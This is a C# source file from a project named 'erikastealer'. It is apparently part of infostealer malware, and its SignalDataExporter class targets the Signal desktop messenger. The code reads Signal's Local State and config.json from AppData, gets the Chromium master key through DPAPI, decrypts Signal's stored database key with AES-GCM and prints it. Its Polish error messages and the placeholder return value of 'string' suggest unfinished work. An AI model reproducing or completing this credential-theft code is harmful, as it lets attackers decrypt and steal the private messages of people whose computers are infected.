using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using System;
using System.Collections.Generic;
using System.Data.SQLite;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;
using erikastealer.Helpers;
using Org.BouncyCastle.Crypto.Paddings;

namespace erikastealer.Exporters
{
    public class SignalDataExporter : IExporter
    {
        private static readonly string SignalAppDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Signal");
        private static readonly string SignalLocalState = Path.Combine(SignalAppDataPath, "Local State");
        private static readonly string SignalConfigPath = Path.Combine(SignalAppDataPath, "config.json");



        public string CreateBackup()
        {
            if (!File.Exists(SignalConfigPath))
            {
                throw new FileNotFoundException("Nie znaleziono pliku Config Path");
            }

            if (!File.Exists(SignalLocalState))
            {
                throw new FileNotFoundException("Nie znaleziono pliku Local State");
            }

            byte[] masterKey = DPAPI.GetChromiumMasterKey(SignalLocalState);

            byte[] decryptedKey = GetSignalEncryptionKey(masterKey);

            return "string";
        }


        byte[] GetSignalEncryptionKey(byte[] masterKey)
        {
            string configjsonContent = File.ReadAllText(SignalConfigPath);
            var json = JsonDocument.Parse(configjsonContent);
            string encryptedSignalKey = json.RootElement.GetProperty("encryptedKey").GetString();

            //Console.WriteLine(encryptedSignalKey);
            try
            {
                byte[] encryptedSignalKeyBytes = HexToBytes(encryptedSignalKey);
                byte[] decryptedKey = DPAPI.DecryptAesGcm(encryptedSignalKeyBytes, masterKey);
                string maybePassphrase = Encoding.UTF8.GetString(decryptedKey);
                Console.WriteLine("=========================");
                Console.WriteLine(maybePassphrase);

                return decryptedKey;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Błąd to: {ex.Message}");
                return null;
            }
        }

        private static byte[] HexToBytes(string hex)
        {
            if (hex.StartsWith("0x", StringComparison.OrdinalIgnoreCase))
                hex = hex.Substring(2);

            int len = hex.Length;
            byte[] bytes = new byte[len / 2];
            for (int i = 0; i < len; i += 2)
            {
                bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
            }
            return bytes;
        }
    }
}



